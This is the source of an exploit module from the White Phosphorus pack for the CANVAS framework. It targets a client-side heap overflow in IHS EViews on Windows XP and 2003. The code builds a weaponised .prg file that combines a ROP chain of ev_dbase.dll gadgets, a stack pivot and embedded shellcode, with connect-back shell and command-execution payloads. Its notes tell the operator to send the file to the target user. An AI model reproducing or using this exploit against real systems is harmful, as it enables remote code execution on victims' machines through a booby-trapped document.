
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside


######################################################################################
NAME = "IHS EViews .prg File Format Clientside Heap Overflow"
DESCRIPTION = "Exploits a clientside heap overflow in IHS EViews"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='IHS Inc'
DOCUMENTATION["Date public"] = "2011-09-19"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://aluigi.altervista.org/adv/eviews_1-adv.txt"
DOCUMENTATION["Notes"] = """
This is a client-side exploit - run the module and send the created file to the target user.
Vulnerability limits shellcode options.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP" ]

NOTES="""
This is a client-side exploit - run the module and send the created file to the target user.
Vulnerability limits shellcode options.

--------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> IHS EViews .prg File Format Clientside Heap Overflow
--------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows 2003+XP Universal (DEP)

Payloads:
0 IE Inject Connect Back
1: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_ihs_eviews_prg/wp_ihs_eviews_prg.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows 2003+XP Universal (DEP)", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit, httpclientside):
            ######################################################################################
            ## WP> Dialog Information
            ######################################################################################
    PAYLOADS=["IE Inject Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.badstring = '\x00\x0a\x0d\x20\x22\x27\x28\x29\x2C\x5C'
        self.badstring += '\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F'
        self.badstring += '\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7D\x7F'
        self.alignstack = True
        self.encode_printable = True
        self.filename= "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".prg"
        return

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def makefile(self):
        filedata = "\x27\x20\x73\x75\x62\x72\x6F\x75\x74\x69\x6E\x65"
        filedata += "\x20\x74\x6F\x20\x70\x6C\x6F\x74\x20\x61\x6E\x20"
        filedata += "\x65\x6C\x6C\x69\x70\x73\x65\x20\x72\x65\x70\x72"
        filedata += "\x65\x73\x65\x6E\x74\x65\x64\x20\x61\x73\x20\x61"
        filedata += "\x20\x71\x75\x61\x64\x72\x61\x74\x69\x63\x20\x66"
        filedata += "\x6F\x72\x6D\x0D\x0A\x27\x09\x28\x78\x2D\x78\x30"
        filedata += "\x29\x27\x42\x28\x78\x2D\x78\x30\x29\x20\x3D\x20"
        filedata += "\x63\x0D\x0A\x27\x0D\x0A\x27\x20\x77\x68\x65\x72"
        filedata += "\x65\x20\x74\x68\x65\x20\x69\x6E\x70\x75\x74\x73"
        filedata += "\x20\x61\x72\x65\x0D\x0A\x27\x0D\x0A\x27\x20\x09"
        filedata += "\x20\x20\x78\x30\x3A\x20\x32\x78\x31\x20\x76\x65"
        filedata += "\x63\x74\x6F\x72\x0D\x0A\x27\x20\x09\x20\x20\x20"
        filedata += "\x42\x3A\x20\x32\x78\x32\x20\x73\x79\x6D\x6D\x65"
        filedata += "\x74\x72\x69\x63\x20\x6D\x61\x74\x72\x69\x78\x0D"
        filedata += "\x0A\x27\x20\x09\x20\x20\x20\x63\x3A\x20\x73\x63"
        filedata += "\x61\x6C\x61\x72\x0D\x0A\x27\x20\x25\x67\x6E\x61"
        filedata += "\x6D\x65\x3A\x20\x6E\x61\x6D\x65\x20\x66\x6F\x72"
        filedata += "\x20\x67\x72\x61\x70\x68\x20\x6F\x62\x6A\x65\x63"
        filedata += "\x74\x0D\x0A\x27\x0D\x0A\x27\x20\x72\x65\x76\x69"
        filedata += "\x73\x65\x64\x20\x33\x2F\x36\x2F\x32\x30\x30\x37"
        filedata += "\x0D\x0A\x0D\x0A\x73\x75\x62\x72\x6F\x75\x74\x69"
        filedata += "\x6E\x65\x20\x78\x78\x78\x28\x76\x65\x63\x74\x6F"
        filedata += "\x72\x20\x78\x78\x78\x2C\x20"
        filedata += wp_randomstring(0x61db-len(filedata))
        filedata += pack('<L', (0x022D6110+0x4)) # ptr to data on heap
        filedata += pack('<L', 0x6C80373C) # xor eax, eax - ev_dbase.dll
        filedata += pack('<L', 0x6C8EF69B) # add eax, 1010
        filedata += pack('<L', 0x6C89246F) # xchg eax, ecx - ev_dbase.dll
        filedata += pack('<L', 0x6C84296D) # pop edi - ev_dbase.dll
        filedata += pack('<L', 0x105CBD40) # dest
        filedata += pack('<L', 0x6C8659B0) # rep movs; pop edi; pop esi; add esp, 28
        filedata += pack('<L', 0x105CBD40+0x118)
        filedata += wp_randomstring(0x2c)
        filedata += pack('<L', 0x6C8A9F1E) # push edi;ret
        filedata += wp_randomstring(0x628c-len(filedata))
        filedata += pack('<L', 0x6C921A10) # readable ptr - ev_dbase.dll
        filedata += wp_randomstring(0x5F)
        filedata += pack('<L', 0x6C825556) # xchg eax, esp - ev_dbase.dll
        filedata += '\x97' # xchg eax, edi
        filedata += '\x94' # xchg eax, esp
        filedata += '\x83\xC4\x05' # add esp, 5
        filedata += self.shellcode
        filedata += wp_randomstring((0x807b-len(filedata)))
        filedata += "\x73\x20\x42\x2C\x20\x73\x63\x61\x6C\x61\x72\x20"
        filedata += "\x63\x2C\x20\x73\x74\x72\x69\x6E\x67\x20\x25\x67"
        filedata += "\x6E\x61\x6D\x65\x29\x0D\x0A\x0D\x0A\x09\x27\x20"
        filedata += "\x69\x6E\x70\x75\x74\x20\x65\x72\x72\x6F\x72\x20"
        filedata += "\x63\x68\x65\x63\x6B\x0D\x0A\x09\x21\x72\x6F\x77"
        filedata += "\x73\x20\x3D\x20\x40\x72\x6F\x77\x73\x28\x42\x29"
        filedata += "\x0D\x0A\x09\x21\x63\x6F\x6C\x73\x20\x3D\x20\x40"
        filedata += "\x63\x6F\x6C\x75\x6D\x6E\x73\x28\x42\x29\x0D\x0A"
        filedata += "\x09\x69\x66\x20\x28\x40\x72\x6F\x77\x73\x28\x78"
        filedata += "\x30\x29\x3C\x3E\x32\x20\x6F\x72\x20\x21\x72\x6F"
        filedata += "\x77\x73\x3C\x3E\x32\x20\x6F\x72\x20\x21\x63\x6F"
        filedata += "\x6C\x73\x3C\x3E\x32\x29\x20\x74\x68\x65\x6E\x0D"
        filedata += "\x0A\x09\x09\x73\x74\x61\x74\x75\x73\x6C\x69\x6E"
        filedata += "\x65\x20\x69\x6E\x70\x75\x74\x20\x61\x72\x67\x75"
        filedata += "\x6D\x65\x6E\x74\x73\x20\x6D\x75\x73\x74\x20\x68"
        filedata += "\x61\x76\x65\x20\x64\x69\x6D\x65\x6E\x73\x69\x6F"
        filedata += "\x6E\x20\x32\x0D\x0A\x09\x09\x72\x65\x74\x75\x72"
        filedata += "\x6E\x0D\x0A\x09\x65\x6E\x64\x69\x66\x0D\x0A\x0D"
        filedata += "\x0A\x09\x27\x20\x67\x65\x74\x20\x65\x69\x67\x65"
        filedata += "\x6E\x76\x61\x6C\x75\x65\x73\x2F\x65\x69\x67\x65"
        filedata += "\x6E\x76\x65\x63\x74\x6F\x72\x73\x0D\x0A\x09\x6D"
        filedata += "\x61\x74\x72\x69\x78\x20\x76\x65\x20\x3D\x20\x40"
        filedata += "\x65\x69\x67\x65\x6E\x76\x65\x63\x74\x6F\x72\x73"
        filedata += "\x28\x42\x29\x0D\x0A\x09\x76\x65\x63\x74\x6F\x72"
        filedata += "\x20\x76\x61\x20\x3D\x20\x40\x65\x69\x67\x65\x6E"
        filedata += "\x76\x61\x6C\x75\x65\x73\x28\x42\x29\x0D\x0A\x0D"
        filedata += "\x0A\x09\x27\x20\x63\x6F\x6E\x73\x74\x72\x75\x63"
        filedata += "\x74\x20\x74\x68\x65\x20\x72\x6F\x74\x61\x74\x69"
        filedata += "\x6F\x6E\x20\x6D\x61\x74\x72\x69\x78\x0D\x0A\x09"
        filedata += "\x21\x61\x6E\x67\x20\x3D\x20\x40\x61\x74\x61\x6E"
        filedata += "\x28\x76\x65\x28\x32\x2C\x31\x29\x2F\x76\x65\x28"
        filedata += "\x31\x2C\x31\x29\x29\x09\x09\x09\x27\x20\x61\x6E"
        filedata += "\x67\x6C\x65\x0D\x0A\x09\x6D\x61\x74\x72\x69\x78"
        filedata += "\x28\x32\x2C\x32\x29\x20\x72\x6F\x74\x0D\x0A\x09"
        filedata += "\x72\x6F\x74\x2E\x66\x69\x6C\x6C\x28\x62\x3D\x72"
        filedata += "\x29\x20\x40\x63\x6F\x73\x28\x21\x61\x6E\x67\x29"
        filedata += "\x2C\x2D\x40\x73\x69\x6E\x28\x21\x61\x6E\x67\x29"
        filedata += "\x2C\x40\x73\x69\x6E\x28\x21\x61\x6E\x67\x29\x2C"
        filedata += "\x40\x63\x6F\x73\x28\x21\x61\x6E\x67\x29\x0D\x0A"
        filedata += "\x0D\x0A\x09\x27\x20\x64\x72\x61\x77\x20\x74\x68"
        filedata += "\x65\x20\x75\x6E\x72\x6F\x74\x61\x74\x65\x64\x20"
        filedata += "\x65\x6C\x6C\x69\x70\x73\x65\x0D\x0A\x09\x76\x65"
        filedata += "\x63\x74\x6F\x72\x28\x31\x30\x31\x29\x20\x74\x68"
        filedata += "\x65\x74\x61\x09\x0D\x0A\x09\x21\x70\x69\x20\x3D"
        filedata += "\x20\x40\x61\x63\x6F\x73\x28\x2D\x31\x29\x0D\x0A"
        filedata += "\x09\x66\x6F\x72\x20\x21\x69\x20\x3D\x20\x31\x20"
        filedata += "\x74\x6F\x20\x31\x30\x31\x0D\x0A\x09\x09\x74\x68"
        filedata += "\x65\x74\x61\x28\x21\x69\x29\x20\x3D\x20\x28\x21"
        filedata += "\x69\x2D\x31\x29\x2A\x32\x2A\x21\x70\x69\x2F\x31"
        filedata += "\x30\x30\x0D\x0A\x09\x6E\x65\x78\x74\x0D\x0A\x0D"
        filedata += "\x0A\x09\x21\x61\x20\x3D\x20\x40\x73\x71\x72\x74"
        filedata += "\x28\x63\x2F\x76\x61\x28\x31\x29\x29\x09\x09\x09"
        filedata += "\x27\x20\x77\x69\x64\x74\x68\x20\x6F\x66\x20\x65"
        filedata += "\x6C\x6C\x69\x70\x73\x65\x0D\x0A\x09\x21\x62\x20"
        filedata += "\x3D\x20\x40\x73\x71\x72\x74\x28\x63\x2F\x76\x61"
        filedata += "\x28\x32\x29\x29\x0D\x0A\x09\x6D\x61\x74\x72\x69"
        filedata += "\x78\x28\x32\x2C\x31\x30\x31\x29\x20\x78\x79\x0D"
        filedata += "\x0A\x09\x66\x6F\x72\x20\x21\x69\x3D\x31\x20\x74"
        filedata += "\x6F\x20\x31\x30\x31\x0D\x0A\x09\x09\x78\x79\x28"
        filedata += "\x31\x2C\x21\x69\x29\x20\x3D\x20\x21\x61\x2A\x40"
        filedata += "\x63\x6F\x73\x28\x74\x68\x65\x74\x61\x28\x21\x69"
        filedata += "\x29\x29\x0D\x0A\x09\x09\x78\x79\x28\x32\x2C\x21"
        filedata += "\x69\x29\x20\x3D\x20\x21\x62\x2A\x40\x73\x69\x6E"
        filedata += "\x28\x74\x68\x65\x74\x61\x28\x21\x69\x29\x29\x0D"
        filedata += "\x0A\x09\x6E\x65\x78\x74\x0D\x0A\x0D\x0A\x09\x27"
        filedata += "\x20\x72\x6F\x74\x61\x74\x65\x20\x0D\x0A\x09\x6D"
        filedata += "\x61\x74\x72\x69\x78\x20\x72\x78\x20\x3D\x20\x72"
        filedata += "\x6F\x74\x2A\x78\x79\x09\x09\x09\x0D\x0A\x09\x27"
        filedata += "\x20\x6F\x66\x66\x73\x65\x74\x0D\x0A\x09\x6D\x61"
        filedata += "\x74\x72\x69\x78\x20\x6F\x6E\x65\x73\x20\x3D\x20"
        filedata += "\x40\x66\x69\x6C\x6C\x65\x64\x6D\x61\x74\x72\x69"
        filedata += "\x78\x28\x31\x2C\x31\x30\x31\x2C\x31\x29\x0D\x0A"
        filedata += "\x09\x72\x78\x20\x3D\x20\x72\x78\x20\x2B\x20\x78"
        filedata += "\x30\x2A\x6F\x6E\x65\x73\x0D\x0A\x09\x72\x78\x20"
        filedata += "\x3D\x20\x40\x74\x72\x61\x6E\x73\x70\x6F\x73\x65"
        filedata += "\x28\x72\x78\x29\x0D\x0A\x0D\x0A\x09\x27\x20\x70"
        filedata += "\x6C\x6F\x74\x0D\x0A\x09\x66\x72\x65\x65\x7A\x65"
        filedata += "\x28\x7B\x25\x67\x6E\x61\x6D\x65\x7D\x29\x20\x72"
        filedata += "\x78\x2E\x73\x63\x61\x74\x0D\x0A\x09\x27\x20\x63"
        filedata += "\x6F\x6E\x6E\x65\x63\x74\x20\x73\x63\x61\x74\x74"
        filedata += "\x65\x72\x20\x77\x69\x74\x68\x6F\x75\x74\x20\x73"
        filedata += "\x79\x6D\x62\x6F\x6C\x73\x0D\x0A\x09\x7B\x25\x67"
        filedata += "\x6E\x61\x6D\x65\x7D\x2E\x73\x65\x74\x65\x6C\x65"
        filedata += "\x6D\x28\x31\x29\x20\x6C\x70\x61\x74\x28\x73\x6F"
        filedata += "\x6C\x69\x64\x29\x20\x73\x79\x6D\x62\x6F\x6C\x28"
        filedata += "\x6E\x6F\x6E\x65\x29\x20\x0D\x0A\x65\x6E\x64\x73"
        filedata += "\x75\x62\x0D\x0A\x0D\x0A"
        return filedata

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
